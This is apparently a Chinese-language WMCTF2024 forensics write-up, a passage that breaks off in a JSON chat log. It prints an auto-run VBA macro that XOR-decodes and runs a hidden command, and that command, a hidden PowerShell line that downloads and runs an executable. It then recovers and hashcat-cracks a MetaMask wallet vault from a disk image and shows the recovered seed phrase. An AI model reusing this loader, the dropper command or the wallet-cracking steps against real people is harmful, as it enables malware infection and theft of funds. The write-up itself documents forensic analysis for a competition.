        if (elements.length > 0) {
            
            activeElement = elements[0];
            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
        }
    
        
        const topLink = document.getElementById('top-link');
        if (topLink) {
            topLink.addEventListener('click', (event) => {
                
                event.preventDefault();
    
                
                window.scrollTo({ top: 0, behavior: 'smooth' });
            });
        }
    }, false);
    
    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);
    
    window.addEventListener('scroll', () => {
        
        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
    
        
        if (scrollPosition === 0) {
            return;
        }
    
        
        if (elements && elements.length > 0) {
            
            activeElement = Array.from(elements).find((element) => {
                if ((getOffsetTop(element) - scrollPosition) > 0 && 
                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
                    return element;
                }
            }) || activeElement;
    
            elements.forEach(element => {
                const id = encodeURI(element.getAttribute('id')).toLowerCase();
                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
                if (element === activeElement){
                    tocLink.classList.add('active');
    
                    
                    const tocContainer = document.querySelector('.toc .inner');
                    const linkOffsetTop = tocLink.offsetTop;
                    const containerHeight = tocContainer.clientHeight;
                    const linkHeight = tocLink.clientHeight;
    
                    
                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
                } else {
                    tocLink.classList.remove('active');
                }
            });
        }
    }, false);
    
    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
    
    function checkTocPosition() {
        const width = document.body.scrollWidth;
    
        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }
    
    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
    
</script>

  <div class="post-content"><h2 id="party-time">Party Time<a hidden class="anchor" aria-hidden="true" href="#party-time">#</a></h2>
<p>桌面上有个 <code>Party invitation.docm</code> ，dump下来一眼宏病毒，oletools可以查看宏的代码：</p>
<pre tabindex="0"><code class="language-vba" data-lang="vba">Private Sub Document_Open()
    Dim p As DocumentProperty
    Dim decoded As String
    Dim byteArray() As Byte
    For Each p In ActiveDocument.BuiltInDocumentProperties
        If p.Name = &#34;Comments&#34; Then
            byteArray = test(p.Value)
            decoded = &#34;&#34;
            For i = LBound(byteArray) To UBound(byteArray)
                decoded = decoded &amp; Chr(byteArray(i) Xor &amp;H64)
            Next i
            Shell (decoded)
            End If
    Next
End Sub

Function test(hexString As String) As Byte()
    Dim lenHex As Integer
    lenHex = Len(hexString)
    Dim byteArray() As Byte
    ReDim byteArray((lenHex \ 2) - 1)
    Dim i As Integer
    Dim byteValue As Integer

    For i = 0 To lenHex - 1 Step 2
        byteValue = Val(&#34;&amp;H&#34; &amp; Mid(hexString, i + 1, 2))
        byteArray(i \ 2) = byteValue
    Next i

    test = byteArray
End Function
</code></pre><p>分析一下可以知道是从 <code>Comments</code> 属性中获取字符串，与0x64异或后执行得到的shell代码，问了gpt，说是在 <code>core.xml</code> 里能找到 <code>hexstring</code> 内容：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>140b130116170c0108084a011c01444913440c0d0000010a444c0a0113490b060e01071044371d171001094a2a01104a33010627080d010a104d4a200b130a080b0500220d08014c430c1010145e4b4b555d564a55525c4a5654534a555e5c545c544b130d0a000b13173b1114000510013b56545650545c55574a011c01434840010a125e100109144f434b130d0a000b13173b1114000510013b56545650545c55574a011c01434d5f37100516104934160b070117174440010a125e10010914434b130d0a000b13173b1114000510013b56545650545c55574a011c0143
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>s <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;140b130116170c0108084a011c01444913440c0d0000010a444c0a0113490b060e01071044371d171001094a2a01104a33010627080d010a104d4a200b130a080b0500220d08014c430c1010145e4b4b555d564a55525c4a5654534a555e5c545c544b130d0a000b13173b1114000510013b56545650545c55574a011c01434840010a125e100109144f434b130d0a000b13173b1114000510013b56545650545c55574a011c01434d5f37100516104934160b070117174440010a125e10010914434b130d0a000b13173b1114000510013b56545650545c55574a011c0143&#34;</span>
</span></span><span style="display:flex;"><span>shell <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,len(s),<span style="color:#ae81ff">2</span>):
</span></span><span style="display:flex;"><span>    shell <span style="color:#f92672">+=</span> chr(int(s[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>],base<span style="color:#f92672">=</span><span style="color:#ae81ff">16</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x64</span>)
</span></span><span style="display:flex;"><span>print (shell)
</span></span></code></pre></div><p>运行结果为powershell恶意脚本，会下载恶意程序放到 <code>$env:temp</code> 目录下并执行：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>powershell.exe -w hidden (new-object System.Net.WebClient).DownloadFile(<span style="color:#e6db74">&#39;http://192.168.207.1:8080/windows_update_20240813.exe&#39;</span>,$env:temp+<span style="color:#e6db74">&#39;/windows_update_20240813.exe&#39;</span>);Start-Process $env:temp<span style="color:#e6db74">&#39;/windows_update_20240813.exe&#39;</span>
</span></span></code></pre></div><p>用FTK Imager挂载ad1文件，在Temp目录下找到 <code>windows_update_20240813.exe</code> ，放到云沙箱里说是有释放文件，在桌面上可以找到 <code>readme.txt</code> 和 <code>flag.rar</code> ，先看看 <code>readme.txt</code> 文件内容：</p>
<pre tabindex="0"><code>Hi, since you are reading this it means you have been hacked. 
 
In addition to encrypting your files, deleting backups, we also downloaded confidential information. 
 
Here&#39;s what you shouldn&#39;t do: 
 
1) Contact the police, fbi or other authorities before the end of our deal 
 
2) Contact the recovery company so that they would conduct dialogues with us. (This can slow down the recovery, and generally put our communication to naught) 
 
3) Do not try to decrypt the files yourself!!! This can lead to the impossibility of their decryption. 
 
4) Keep us for fools) 
 
We will also stop any communication with you, and continue DDoS, calls to employees and business partners.  
 
In a few weeks, we will simply repeat our attack and delete all your data from your networks, WHICH WILL LEAD TO THEIR UNAVAILABILITY! 
 
Here&#39;s what you should do right after reading it: 
 
1) If you are an ordinary employee, send our message to the CEO of the company, as well as to the IT department 
 
2) If you are a CEO, or a specialist in the IT department, or another person who has weight in the company, you should contact us within 24 hours by email. 
 
We are ready to confirm all our intentions regarding DDOS, calls, and deletion of the date at your first request. 
 
Mails to contact us: 
 
weary_meadow@163.com
</code></pre><p><code>flag.rar</code> 就是勒索软件加密的文件，考虑逆向获取加密逻辑：</p>
<p><img loading="lazy" src="/images/WMCTF2024/1.png"></p>
<p>可以看到在注册表里存放了RSA的密钥，具体看看函数的话可以知道公私钥都在注册表里，并且还有一个Devicekey，值为hostname的sha256值，最终实现了一个RSA-OAEP Encrypt的操作：</p>
<p><img loading="lazy" src="/images/WMCTF2024/2.png"></p>
<p>赛后重新搞了一下python环境的volatility2，发现可以跑出profile来，先查注册表里的key：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python2 vol.py -f 1.raw --profile<span style="color:#f92672">=</span>Win10x64_19041 printkey -K <span style="color:#e6db74">&#34;SOFTWARE\nothing&#34;</span>
</span></span></code></pre></div><p>只需提出privatekey用于解密：</p>
<pre tabindex="0"><code class="language-pem" data-lang="pem">-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA0WudoQ2mgYalJ2LKLzxeqVydTdteAQkdllvhu/jh7+pCTvUJ
uNMJEdSFphVAIp53BBuGVp0xwSav8hbffHX+Fdn7ZRN0YecgDtPA3Pd3y9jcutVZ
yes8Wjbpt6qTD+ITl1nPsKqsB2Ry1BhFYWBC8+2YniKQqb4UE3Kr7LE78Tb8ABp9
epe4AMguNHlgdC97DpJ5R7/esRjMey/NWdFXN1LsQYCn9/UGwVhLG3gmPn200XE6
KLjXRijrN23lwpDw88J7pfJCbfh/jgpoe91Rmq/ADs4mwhXcNRafmsNixCj/Zwcr
3ANPuTNOKmH6IaPWg410O+1q2noV67cLi/NrIQIDAQABAoIBAQCuljT3S1YArauJ
xkYgUwfn0Zoiijs4Sc0syLTL7JUPWhClmorcVrM89hvlddneApXeCsRX+Py9te8A
uCjgrc2BkhSPE0T3SaPkOIyUqopomwaJi8wrFb1eyGDYCZBIsYT7rJgFBIQeNZO1
VfahU4r9qJqPWumXWSuLexHxZWA/msByzrijZIP5ufeuIzCNLV6yOPOhSMIHCA3s
hOjOQsW76q+fVIGAR8qHFj/Ee02ta4engXEhBWa5Y7pLqtihHdZIcn0KRxx3+Ev5
kJhBMIPazdneQ/KiP5wzkdSYoTf9+hLjYGQu6A3T2GqzrOvlsd6gNfq/WlrKzIa6
P7wqXhhBAoGBANmHWpnPUZvR0LXLMi8n+zE7FWhtVI5eZltpVou1XefYt6/LZLv9
/pSQCZRRwqUQTjFWOKcg+H2rRdKVc7h/fySXDlmUkE9Ep4REqAAMEGRQKRUJrq2D
KiNq7E08dZpoAiaH4PaZKMsuubxpJX3WSTkLVXnusN0TObCibjnKk2mdAoGBAPZ1
J6roXjv6f4N3+i/aUUh/UaGlJuhqyi8ALiI7+9dIVrKyU8ULjjnlb3F8Mg4n8FQb
AxTAnN9HvDBYLwwWo48yD7zzNPlxwF3rEiUuZ8BjUGMuN1QIPT0wSDvKjOdOoQFB
HkNu/Ysjfp4paET0foYRzu62eAzh9mAegM9PHKJVAoGASudf3EzWViiGjML+cdx7
k7U7puzWy/tXlayNH6iBQH+QqNkJw+4vRqrekZMhykL2GekNswcYafWbImtSILrO
ZiQZzeDpXFJQuKwHiZSd5Fzx+IuP+bGLxgxgeCwUdunPq8LoRSHyORzK2kT+ovkx
15G+ijEV99pR6C/WctH9tsUCgYAVlP7LRZvy7qW58oizJhAWJCgW2qqEkc1wvjhM
ASq1mH0XGuyhBbkHsuLGclTDzpWKF+92IsPZ/aMqLJ66FUVvZbfhGP8blO1+i/ZD
0UN+onPIq6RmtG4AbLj2m28pVkZdIMGwsAh95bbRzNh3qV1nCiov10S+BA+aLTGk
dc4RHQKBgBPT6/JmHGe6MqbEfnu7H0FyubseQ5B5bsWrw9xX0gVwjDV6iiTnqLT0
lD5qVyb4nGAcaqn7Wm3Hoykom6x7CnueBHY7HHGq21bvTOQv/aC59mZxpPaDEMUR
eROsDq1jsfYVTBwpUDoWP7yRAv5tiUHU0BtjwlozyfvgJOIpjTMg
-----END RSA PRIVATE KEY-----
</code></pre><p>再可以从环境变量里找到hostname，结果里很多都有主机名：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python2 vol.py -f 1.raw --profile<span style="color:#f92672">=</span>Win10x64_19041 envars
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">6488</span> conhost.exe          0x00000239b11d0fe0 USERDOMAIN                     DESKTOP-8KRF7H0
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">6488</span> conhost.exe          0x00000239b11d0fe0 USERDOMAIN_ROAMINGPROFILE      DESKTOP-8KRF7H0
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>原勒索软件是Go语言编写的，python的RSA-OAEP好像解不出原文件：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;crypto/rand&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;crypto/rsa&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;crypto/sha256&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;crypto/x509&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;encoding/pem&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;fmt&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;io/ioutil&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;log&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">hostname</span> = <span style="color:#e6db74">&#34;DESKTOP-8KRF7H0&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">//read and parse key</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">privateKeyFile</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">ioutil</span>.<span style="color:#a6e22e">ReadFile</span>(<span style="color:#e6db74">&#34;RSAprivatekey.pem&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalf</span>(<span style="color:#e6db74">&#34;Read RSAprivatekey file Error: %v&#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">block</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">pem</span>.<span style="color:#a6e22e">Decode</span>(<span style="color:#a6e22e">privateKeyFile</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">block</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">nil</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">block</span>.<span style="color:#a6e22e">Type</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;RSA PRIVATE KEY&#34;</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalf</span>(<span style="color:#e6db74">&#34;Decode RSAprivatekey file Error:%v&#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">RSAprivateKey</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">x509</span>.<span style="color:#a6e22e">ParsePKCS1PrivateKey</span>(<span style="color:#a6e22e">block</span>.<span style="color:#a6e22e">Bytes</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalf</span>(<span style="color:#e6db74">&#34;Parse RSAprivatekey file Error: %v&#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">encryptedFile</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">ioutil</span>.<span style="color:#a6e22e">ReadFile</span>(<span style="color:#e6db74">&#34;flag.rar&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalf</span>(<span style="color:#e6db74">&#34;Read encrypted file Error: %v&#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">//RSA OAEP and SHA-256</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">devicekey</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">sha256</span>.<span style="color:#a6e22e">Sum256</span>([]byte(<span style="color:#a6e22e">hostname</span>))
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">label</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">devicekey</span>[:]
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">hash</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">sha256</span>.<span style="color:#a6e22e">New</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">decryptedFile</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">rsa</span>.<span style="color:#a6e22e">DecryptOAEP</span>(<span style="color:#a6e22e">hash</span>, <span style="color:#a6e22e">rand</span>.<span style="color:#a6e22e">Reader</span>, <span style="color:#a6e22e">RSAprivateKey</span>, <span style="color:#a6e22e">encryptedFile</span>, <span style="color:#a6e22e">label</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalf</span>(<span style="color:#e6db74">&#34;RSADecryptOAEP Error: %v&#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">ioutil</span>.<span style="color:#a6e22e">WriteFile</span>(<span style="color:#e6db74">&#34;output.rar&#34;</span>, <span style="color:#a6e22e">decryptedFile</span>, <span style="color:#ae81ff">0666</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalf</span>(<span style="color:#e6db74">&#34;Write decrypted file Error: %v&#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Decrypt encrypted file successfully&#34;</span>)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>最后得到的 <code>out.rar</code> 可以正常解压拿到flag：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>WMCTF{dae66e1b-a0e7-4744-ade3-f5a5b4a95c09}
</span></span></code></pre></div><hr>
<h2 id="metasecret">metasecret<a hidden class="anchor" aria-hidden="true" href="#metasecret">#</a></h2>
<p>复现的时候找到一篇文章，感觉也挺有参考价值的，是关于Google插件中小狐狸钱包助记词恢复的：https://zgao.top/metamask%E4%BB%8E%E6%8F%92%E4%BB%B6%E6%96%87%E4%BB%B6%E4%B8%AD%E6%81%A2%E5%A4%8D%E5%8A%A9%E8%AE%B0%E8%AF%8D/</p>
<p>附件为ad1文件，使用FTK Imager挂载</p>
<p>在Firefox中，需要找到idb文件进而获取MetaMask的vault，可以结合着修改日期来找，发现idb文件位于目录<code>G:\AppData\Roaming\Mozilla\Firefox\Profiles\jawk8d8g.default-release\storage\default\moz-extension+++654e5b4f-4a65-4e1a-9b58-51733b6a2883^userContextId=4294967295\idb\3647222921wleabcEoxlt-eengsairo.files</code>下，文件名称为<code>492</code></p>
<p>可以010 Editor硬搜 <code>keyMetadata</code> ，然后从里面找出vault：</p>
<pre tabindex="0"><code>{&#34;data&#34;:&#34;WT5WJKyy+Ol+hgVsSKViRytzII2INhhftI5RJlgvuNuLx/MxDXMZtaIxfNeC/7LnvcfgitrTcQCQBh5ULv8AemL6SFSjzcACNrlCRIcppYmUFuMp6clW7nUi+My0Rj521yd/kwmLuHNToIRiACSezzLAWHkLXnZuvtDX2zyRvISZ0AQBseFXBecB0xKa0hcdoGsxBRBnK0vPvFf8b9TGfFAB7Qefh2O8GrFqzc40qX42gCgs+gVe0uq0A6SUSMKlwomMSfGQZJt6xfwMBZy8Or0kO0+D2Bjj0AgyIZaOeQ6S8IL/zcfO5Qi+gFaGpo6sGVOk1Yiu9+8enZvOuUW5IiIgydrzFKRixEMClAPa9MLDt3cksq52DxzorFLN8vYBqFY39DYQdSebg0HC6+Ww7XMz+b8FFKLqxLroar8F8IxP9WE1BHDIiT7mOcrUZnKW+W1Mmq6vbz+XuHmpz46OR8oD1KjwRVWV61qvTf7sg2H56fxbGrzjml89HATckwPrJ0cEwTAQcIkPZOA/DuuWsoHr6X6U4jYWJ+qwJFKYMIbwSWIdOmXKhb3kuJIS1YZzRCqHNJ0opudN6sRVOf/+nRp6wC4ww8LRTK1e1KTJ3aHdna7mIOJzMMO/0U0Gn9EDb4EMrK5XMzuZB0UaOR+9YmQaTUKGAQRNLVHMpdMgLQkVnxbZp4bIJiTRpXaKbIip+am9HAy4uq47vkY7ql72tQ5E4x9Ipkx4dKXF6ppiBBip6ag6QQ==&#34;,&#34;iv&#34;:&#34;fPymLoml7KKyZ5wdqwylqg==&#34;,&#34;keyMetadata&#34;:{&#34;algorithm&#34;:&#34;PBKDF2&#34;,&#34;params&#34;:{&#34;iterations&#34;:600000}},&#34;salt&#34;:&#34;xN8qVOAe6KF+JTti1cOyGNBNdSWTlumu1YQi2A4GcbU=&#34;}
</code></pre><p>用meta2hashcat转成hashcat支持的格式：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python metamask2hashcat.py --vault wallet | tee wallet.hash
</span></span><span style="display:flex;"><span>$metamask$xN8qVOAe6KF+JTti1cOyGNBNdSWTlumu1YQi2A4GcbU<span style="color:#f92672">=</span>$fPymLoml7KKyZ5wdqwylqg<span style="color:#f92672">==</span>$WT5WJKyy+Ol+hgVsSKViRytzII2INhhftI5RJlgvuNuLx/MxDXMZtaIxfNeC/7LnvcfgitrTcQCQBh5ULv8AemL6SFSjzcACNrlCRIcppYmUFuMp6clW7nUi+My0Rj521yd/kwmLuHNToIRiACSezzLAWHkLXnZuvtDX2zyRvISZ0AQBseFXBecB0xKa0hcdoGsxBRBnK0vPvFf8b9TGfFAB7Qefh2O8GrFqzc40qX42gCgs+gVe0uq0A6SUSMKlwomMSfGQZJt6xfwMBZy8Or0kO0+D2Bjj0AgyIZaOeQ6S8IL/zcfO5Qi+gFaGpo6sGVOk1Yiu9+8enZvOuUW5IiIgydrzFKRixEMClAPa9MLDt3cksq52DxzorFLN8vYBqFY39DYQdSebg0HC6+Ww7XMz+b8FFKLqxLroar8F8IxP9WE1BHDIiT7mOcrUZnKW+W1Mmq6vbz+XuHmpz46OR8oD1KjwRVWV61qvTf7sg2H56fxbGrzjml89HATckwPrJ0cEwTAQcIkPZOA/DuuWsoHr6X6U4jYWJ+qwJFKYMIbwSWIdOmXKhb3kuJIS1YZzRCqHNJ0opudN6sRVOf/+nRp6wC4ww8LRTK1e1KTJ3aHdna7mIOJzMMO/0U0Gn9EDb4EMrK5XMzuZB0UaOR+9YmQaTUKGAQRNLVHMpdMgLQkVnxbZp4bIJiTRpXaKbIip+am9HAy4uq47vkY7ql72tQ5E4x9Ipkx4dKXF6ppiBBip6ag6QQ<span style="color:#f92672">==</span>
</span></span></code></pre></div><p>不过注意由于metamask变更过几次钱包的加密算法，所以需要在github下载导入hashcat的modules模块：</p>
<pre tabindex="0"><code>https://github.com/flyinginsect271/MetamaskHashcatModule/blob/main/module-26650-win-linux.zip
</code></pre><p>kali下可以将 <code>.so</code> 文件导入目录/usr/share/hashcat/modules，同时可以在磁盘目录<code>文档</code>中找到<code>passwords.txt</code>，进行hashcat爆破，过程中遇到了两个问题：</p>
<p>第一个是无法识别hash文件格式，windows下可能需要用notepad打开 <code>wallet.hash</code> ，另存为utf-8编码格式</p>
<p>第二个是在爆破时报内存不足：<code>hashcat Device #1: Not enough allocatable device memory for this attack.</code>，增加虚拟机的内存即可，我从2G加到了4G</p>
<p>根据hashcat的提示，爆破完后还需要用以下命令才能看到password：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ hashcat -a <span style="color:#ae81ff">0</span> -m <span style="color:#ae81ff">26650</span> wallet.hash passwords.txt --show 
</span></span><span style="display:flex;"><span>$metamask$xN8qVOAe6KF+JTti1cOyGNBNdSWTlumu1YQi2A4GcbU<span style="color:#f92672">=</span>$fPymLoml7KKyZ5wdqwylqg<span style="color:#f92672">==</span>$WT5WJKyy+Ol+hgVsSKViRytzII2INhhftI5RJlgvuNuLx/MxDXMZtaIxfNeC/7LnvcfgitrTcQCQBh5ULv8AemL6SFSjzcACNrlCRIcppYmUFuMp6clW7nUi+My0Rj521yd/kwmLuHNToIRiACSezzLAWHkLXnZuvtDX2zyRvISZ0AQBseFXBecB0xKa0hcdoGsxBRBnK0vPvFf8b9TGfFAB7Qefh2O8GrFqzc40qX42gCgs+gVe0uq0A6SUSMKlwomMSfGQZJt6xfwMBZy8Or0kO0+D2Bjj0AgyIZaOeQ6S8IL/zcfO5Qi+gFaGpo6sGVOk1Yiu9+8enZvOuUW5IiIgydrzFKRixEMClAPa9MLDt3cksq52DxzorFLN8vYBqFY39DYQdSebg0HC6+Ww7XMz+b8FFKLqxLroar8F8IxP9WE1BHDIiT7mOcrUZnKW+W1Mmq6vbz+XuHmpz46OR8oD1KjwRVWV61qvTf7sg2H56fxbGrzjml89HATckwPrJ0cEwTAQcIkPZOA/DuuWsoHr6X6U4jYWJ+qwJFKYMIbwSWIdOmXKhb3kuJIS1YZzRCqHNJ0opudN6sRVOf/+nRp6wC4ww8LRTK1e1KTJ3aHdna7mIOJzMMO/0U0Gn9EDb4EMrK5XMzuZB0UaOR+9YmQaTUKGAQRNLVHMpdMgLQkVnxbZp4bIJiTRpXaKbIip+am9HAy4uq47vkY7ql72tQ5E4x9Ipkx4dKXF6ppiBBip6ag6QQ<span style="color:#f92672">==</span>:silversi
</span></span></code></pre></div><p>拿到password之后可以去官网解这个vault拿到私钥助记词：</p>
<pre tabindex="0"><code>acid happy olive slim crane avoid there cave umbrella connect rain vessel
</code></pre><p>重置密码的时候小狐狸钱包一直在转圈，不知道怎么回事，打算用非预期解法，从Firefox缓存入手：</p>
<p><img loading="lazy" src="/images/WMCTF2024/3.png"></p>
<p>可以看到不少url里都有web3mq，这是一个Web3的社交应用，结合前面的metamask，可以想到应该在这上面有过聊天记录，可以直接找 <code>/messages/history</code> ，再到 <code>entries</code> 目录下找到对应的 <code>cache name</code> ：</p>
<p><img loading="lazy" src="/images/WMCTF2024/4.png"></p>
<p>Firefox使用 <strong>Brotli</strong> 压缩来优化缓存，所以把对应文件的前面一小段base64编码后在线网站解压缩即可拿到聊天记录：</p>
<p><img loading="lazy" src="/images/WMCTF2024/5.png"></p>
<p><img loading="lazy" src="/images/WMCTF2024/6.png"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;msg&#34;</span>:<span style="color:#e6db74">&#34;Ok&#34;</span>,<span style="color:#f92672">&#34;code&#34;</span>:<span style="color:#ae81ff">0</span>,<span style="color:#f92672">&#34;data&#34;</span>:{<span style="color:#f92672">&#34;result&#34;</span>:[{<span style="color:#f92672">&#34;cipher_suite&#34;</span>:<span style="color:#e6db74">&#34;NONE&#34;</span>,<span style="color:#f92672">&#34;from&#34;</span>:<span style="color:#e6db74">&#34;user:7bf813cdee8644aa90e833b84116533efdbf8a2ef67ce66508ed76cb&#34;</span>,<span style="color:#f92672">&#34;from_sign&#34;</span>:<span style="color:#e6db74">&#34;L2uZmWFwNvh/XcMKET1Y60MntEQTBfZHzL/ajlP3czOKzi2Y7RdwAzZuz9UwKENSLlcH2Ym9bRmHVkTBksynAA==&#34;</span>,<span style="color:#f92672">&#34;message_status&#34;</span>:{},<span 